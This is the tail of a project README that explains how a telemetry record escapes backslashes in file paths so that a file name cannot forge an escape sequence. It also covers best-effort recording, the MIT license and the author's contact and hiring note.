Literal backslashes in a path are doubled, so a file *named* `\u{202E}` cannot forge a real escape sequence. That doubling on its own does not set `pathHasEscapes`. The reasoning behind both fields, and the residuals the record still carries, is in the [ADR-0011 amendment](./docs/decisions/0011-telemetry-store-and-migrations.md); the field-by-field contract sits with the payload definition in [src/telemetry/types.ts](./src/telemetry/types.ts).

Recording is best-effort: a harness embedded without a `telemetry` dependency records nothing, and a failed write is downgraded to a warning rather than aborting the run.

---

## License

[MIT](./LICENSE). See [ADR-0002](./docs/decisions/0002-mit-license.md) for the reasoning.

---

## Author

Jackson Anstee: [github.com/jacksonanstee](https://github.com/jacksonanstee) · [linkedin.com/in/jackson-anstee](https://www.linkedin.com/in/jackson-anstee-73738263/)

If you are hiring for AI engineering, agent infrastructure, or LLM-app security roles, this repo represents how I scope, design, and ship. Reach out; I would welcome the conversation.
